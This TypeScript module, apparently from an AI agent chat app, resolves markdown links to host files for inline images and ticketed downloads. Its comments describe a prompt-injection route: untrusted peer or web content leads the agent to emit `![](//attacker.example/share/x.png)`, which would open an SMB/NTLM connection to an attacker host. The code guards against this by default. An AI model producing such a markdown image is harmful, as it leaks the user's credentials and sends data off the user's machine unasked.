import type { HostFileResolver, HostImage } from "@novaclaw/ui/context/marked"
import { inlineMediaFromFile } from "@novaclaw/session-ui/pierre/media"
import { TICKET_QUERY } from "@novaclaw/schema/ticket"
import { instanceBase, instanceFileReader, instanceMediaNote, instanceTicketMinter } from "./instance-origin"

// FILES A COLLEAGUE MADE, reachable from the chat log (owner, 2026-08-22: *"the agent can embed
// links to the files on the host machine, which user can just click in the chat log to download, as
// well as link images, like say generated svgs or pngs"*).
//
// 🔴 **The gap this closes is the other half of a workspace.** A colleague now has somewhere to write
// (`AgentPlugin.scratchDirsFor`) and knows about it (`SystemCompose.workspaceSection`), and the user
// can browse it (`/files?path=`). What it could not do is HAND something over: it would say "I've
// written the chart to C:\…\chart.svg" and that sentence was inert text. Under the metaphor an
// officer that produces work has to be able to give it to you.
//
// ⚠️ **This is a LOCAL render, not an upload.** The bytes travel from the user's own instance to the
// user's own client over `/api/fs/read`, which the Files app already uses to browse any absolute
// path. Nothing egresses, and an agent embedding a path it should not have named renders a broken
// image on the user's screen rather than sending anything anywhere.
//
// ⚠️ That last sentence is a CLAIM the parser has to earn, and there was exactly one input for which
// it was false: a path rooted on another machine (`//host/share/…`) is a network destination, not a
// local file, and the chat renders an image href with no click. See `isRemote` below.

/** Extensions the chat renders INLINE rather than offering as a download. */
const IMAGE = new Set(["png", "jpg", "jpeg", "gif", "webp", "svg", "bmp", "avif", "ico"])

export interface HostFile {
  /** The parent directory — what `/api/fs/read` takes as its location. */
  readonly directory: string
  /** The file's own name, which becomes the path segment. */
  readonly name: string
  /** Inline `<img>` when true, a download link when false. */
  readonly image: boolean
}

/**
 * Backslashes become forward slashes BEFORE anything else looks at the path.
 *
 * ⚠️ Everything downstream then reasons in one alphabet. The first version tested `[\/]` inside a
 * regex and shipped `[\/]` — a class containing only the forward slash — so every Windows path fell
 * through as "not a file". It typechecked and read correctly. Normalising once removes the need for a
 * backslash in any pattern, which is the fix that cannot regress the same way.
 */
const slashes = (raw: string): string => raw.split(SEPARATOR).join("/")

const SEPARATOR = String.fromCharCode(92)

/** A path rooted on a drive (`C:/…`) or on `/`. A UNC share is `//host/share` — see {@link isRemote}. */
const isAbsolute = (raw: string): boolean => /^[a-zA-Z]:\//.test(raw) || raw.startsWith("/")

/**
 * A path whose ROOT is another machine: `//host/share/…` after normalisation, in any of the spellings
 * that reach it (`\\host\share`, `//host/share`, `file://///host/share`).
 *
 * 🔴 **This is a NETWORK DESTINATION wearing a path's clothes, and the chat log is where an attacker
 * gets to choose one.** Everything a peer or a fetched page says is untrusted content that reaches a
 * model (AGENTS.md — *the community is a network of agents*), and a colleague quoting it back is one
 * markdown image away from `![](//attacker.example/share/x.png)`. That href needs no click: the chat
 * renders it INLINE, the browser asks the instance for it, and the instance — which is the machine
 * with the user's files and credentials on it — opens an SMB connection to a host named by the
 * attacker. On Windows that hands over an NTLM exchange before anything has decided whether the file
 * exists, and it is egress the user never asked for (principle 4: the data plane does not leave).
 *
 * The whole point of this module is that a host file link "renders a broken image rather than
 * sending anything anywhere", and a remote root is the one input for which that sentence was false.
 */
const isRemote = (normalised: string): boolean => normalised.startsWith("//")

export interface HostFileOptions {
  /**
   * Allow a path rooted on another machine. **Default `false`, and the default is the security
   * property** — the caller that may say `true` is the one where the USER chose the path (the Files
   * browser, which can legitimately be sitting on a mapped share), never one where a model or a
   * document did. Making the safe answer the one you get by not thinking about it is the difference
   * between a guard and a convention.
   */
  readonly remote?: boolean
}

/**
 * Is this markdown href a file on the host, and what should it render as?
 *
 * ⚠️ **`undefined` for anything not clearly a local absolute path**, which is the safe direction: a
 * link the chat leaves alone still works as an ordinary link, while a web URL wrongly treated as a
 * file would break a working one. `http(s)`, `mailto`, in-page anchors and relative paths are all
 * left to the existing renderer.
 */
export const hostFile = (href: string | undefined, options: HostFileOptions = {}): HostFile | undefined => {
  const raw = (href ?? "").trim()
  if (raw === "") return undefined
  if (/^(?!file:)[a-z][a-z0-9+.-]*:\/\//i.test(raw)) return undefined
  // `file://` is how a model most often writes one, and it survives markdown autolinking intact.
  // ⚠️ Strip only the SCHEME, never the third slash: `file:///home/x` is the POSIX root and dropping
  // it yields the relative `home/x`, which is then rejected as not absolute. A drive path arrives as
  // `/C:/…` instead, so that one leading slash comes off and nothing else does.
  let stripped = raw
  if (/^file:\/\//i.test(stripped)) {
    stripped = decodeURIComponent(stripped.slice("file://".length))
    if (/^\/[a-zA-Z]:/.test(stripped)) stripped = stripped.slice(1)
  }
  const normalised = slashes(stripped)
  if (!isAbsolute(normalised)) return undefined
  if (isRemote(normalised) && options.remote !== true) return undefined
  // ⚠️ A query or fragment is not part of a path. A model that writes `chart.svg#legend` means the
  // file, and passing the fragment through would ask the server for a name that does not exist.
  const clean = (normalised.split(/[?#]/)[0] ?? "").replace(/\/+$/, "")
  const cut = clean.lastIndexOf("/")
  if (cut <= 0) return undefined
  const name = clean.slice(cut + 1)
  if (name === "") return undefined
  const dot = name.lastIndexOf(".")
  const extension = dot > 0 ? name.slice(dot + 1).toLowerCase() : ""
  return { directory: clean.slice(0, cut), name, image: IMAGE.has(extension) }
}

/**
 * The instance URL that serves one host file, optionally carrying a ticket.
 *
 * 🔴 **Only ever built inside a CLICK now.** This used to be handed to the markdown renderer, which
 * wrote it into an `<a href download>` — and a `download` href is fetched by the browser, which
 * sends no `Authorization`. `HostFileTarget` no longer has a `url` member at all, so the only code
 * that can reach this function is code that can also mint the ticket it needs.
 *
 * ⚠️ **`ticket`, never `auth_token`.** That parameter is `btoa("user:password")` — the instance's
 * own password — and `workspaceProxyURL` copies a query string wholesale into a proxy target, so a
 * request merely passing through an instance would carry its password to a machine that is not
 * ours. A ticket names one file, works once and expires in a minute; it is a capability, and it is
 * why the URL form is admissible here at all.
 *
 * ⚠️ **`location[directory]`, not `directory`** — and this was measured, not read. `LocationQuery` is
 * a deepObject parameter (`protocol/groups/location.ts`), so the flat form answers 500. The unit
 * tests asserted the flat spelling happily, because they were checking this function against itself;
 * only calling the real endpoint said otherwise.
 *
 * ⚠️ Both halves are encoded. A Windows path carries a colon and spaces are ordinary in a user's
 * folders; an unencoded directory truncates the query at the drive letter and an unencoded `name`
 * breaks on the first space.
 */
export const fileUrl = (base: string, file: HostFile, ticket?: string): string =>
  `${base.replace(/\/+$/, "")}/api/fs/read/${encodeURIComponent(file.name)}?location%5Bdirectory%5D=${encodeURIComponent(file.directory)}${ticket ? `&${TICKET_QUERY}=${encodeURIComponent(ticket)}` : ""}`

/**
 * Most resolved images kept at once.
 *
 * ⚠️ This is a DEDUPLICATOR, not the cache. The rendered HTML is what is really kept (200 entries,
 * `session-ui/src/components/markdown-cache.tsx`); this map only has to survive the burst of
 * re-parses one streaming message produces, so it is deliberately small — sixteen maximal entries is
 * already more memory than a chat screen has images.
 */
const MEMO_MAX = 16

/** Keyed by `(base, directory, name)` — the three things that decide WHICH bytes are wanted. */
const memo = new Map<string, Promise<HostImage>>()

const memoKey = (base: string, file: HostFile): string => [base, file.directory, file.name].join("\n")

/** Least-recently-used, and a hit RE-INSERTS so a repeatedly re-parsed image is never evicted. */
const remember = (key: string, read: () => Promise<HostImage>): Promise<HostImage> => {
  const existing = memo.get(key)
  if (existing) {
    memo.delete(key)
    memo.set(key, existing)
    return existing
  }
  // ⚠️ The PROMISE is stored, not its result. A streaming message re-parses the same block many
  // times a second, and caching only on completion would let a dozen reads of one file be in flight
  // at once — which is exactly the refetch storm this exists to prevent.
  const pending = read()
  memo.set(key, pending)
  for (const oldest of memo.keys()) {
    if (memo.size <= MEMO_MAX) break
    memo.delete(oldest)
  }
  return pending
}

/** Test seam: forget every memoised read, so one test's fetch count cannot be another's. */
export const forgetAgentFileImages = (): void => memo.clear()

const readInline = async (file: HostFile): Promise<HostImage> => {
  const read = instanceFileReader()
  const note = instanceMediaNote()
  if (!read) return { ok: false, reason: "unreadable", note: note || undefined }
  const content = await read(file.directory, file.name).catch(() => undefined)
  const inline = inlineMediaFromFile(content, file.name)
  if (inline.ok) return { ok: true, src: inline.src }
  return { ok: false, reason: inline.reason, note: note || undefined }
}

/**
 * The resolver the markdown renderer is given.
 *
 * 🔴 **Built on the CONNECTED instance, not on the page's origin** (owner, 2026-08-22: *"when the
 * user and the agent are on different machines"*). A person driving the Spark from their laptop must
 * get the Spark's copy of a report — a same-origin URL would ask their own machine for a path that
 * exists on somebody else's, and the remote colleague is precisely the one whose files they cannot
 * otherwise reach. `instanceBase()` is read at CALL time so switching servers mid-session re-points
 * links that were already rendered.
 *
 * 🔴 **`inline` reads the BYTES; `target` only ever builds a download URL.** An `<img src>` is a
 * subresource and carries no credential, so a route there is broken on any instance with a server
 * password. The class fix already shipped one component over — `session-ui/src/components/
 * file-media.tsx` reads through the authenticated client and converts to a `data:` URL — and this is
 * the same mechanism, not a second one: the same `client.file.read` call, the same
 * `pierre/media.ts` conversion.
 */
export const agentFileResolver: HostFileResolver = {
  target: (href) => {
    const file = hostFile(href)
    if (file === undefined) return undefined
    return { name: file.name, image: file.image }
  },
  download: (href) => downloadHostFile(href),
  inline: (href) => {
    const file = hostFile(href)
    // ⚠️ `hostFile` again, with the DEFAULT options — so `//host/share/x.png` is still refused here.
    // Reading it would open an SMB connection to an attacker-named host from the machine holding the
    // user's files; only the Files browser, where the user chose the path, may pass `remote: true`.
    if (file === undefined || !file.image) return Promise.resolve<HostImage>({ ok: false, reason: "unreadable" })
    return remember(memoKey(instanceBase(), file), () => readInline(file))
  },
}

/**
 * Hand the browser one file to save, from the connected instance.
 *
 * 🔴 **A ticket, then a STREAM — never bytes through this process.** The chat's image path reads a
 * file through the authenticated client and pastes it into a `data:` URL, and that answer is
 * refused here on purpose: the Files browser exists to fetch the artefacts a colleague produced,
 * and a report, an archive or a video must never have to fit in a JS string. So the credential buys
 * a short-lived single-use ticket and the browser does the fetching, exactly as it did before —
 * with the difference that it is now authorized to.
 *
 * ⚠️ **A detached anchor rather than the clicked one.** Both sinks — a chat file link and a Files
 * row — arrive here after their own `preventDefault`, so there is no element left holding a usable
 * href; and one code path for both is what stops the two drifting apart again.
 *
 * ⚠️ **A refused mint degrades to the unticketed URL, which is what HEAD always sent.** Nothing is
 * regressed by that: an instance with no server password serves it, and one with a password
 * answers the same 401 it did before this fix — the difference is that the 401 is now the fallback
 * rather than the only behaviour. Silently doing nothing would be a worse answer than the old bug.
 */
export const downloadHostFile = (href: string, options: HostFileOptions = {}): void => {
  const file = hostFile(href, options)
  // ⚠️ `hostFile` again, at CLICK time and with the caller's own options — so `//host/share/x.pdf`
  // is refused here too unless the Files browser asked for it. The path travelled through an HTML
  // attribute to get here; a guard applied only before it was written there is a guard that a
  // replayed or hand-edited attribute walks straight past.
  if (file === undefined) return
  void ticketFor(file).then((ticket) => save(fileUrl(instanceBase(), file, ticket), file.name))
}

const ticketFor = (file: HostFile): Promise<string | undefined> => {
  const mint = instanceTicketMinter()
  if (!mint) return Promise.resolve(undefined)
  return mint(file.directory, file.name).catch(() => undefined)
}

const save = (url: string, name: string): void => {
  const anchor = document.createElement("a")
  anchor.href = url
  anchor.download = name
  anchor.rel = "noopener"
  anchor.style.display = "none"
  document.body.appendChild(anchor)
  anchor.click()
  anchor.remove()
}

/**
 * Save one absolute host path — the Files browser's Download.
 *
 * ⚠️ `remote: true` here and NOWHERE ELSE. This path is reached from a row the user navigated to in
 * the Files browser, so the share was already opened by their own choice and refusing it would take
 * a working download away from anyone whose workspace lives on one. The chat's resolver above keeps
 * the default, because there the path is a string a model wrote.
 */
export const downloadHostPath = (absolute: string): void => downloadHostFile(absolute, { remote: true })
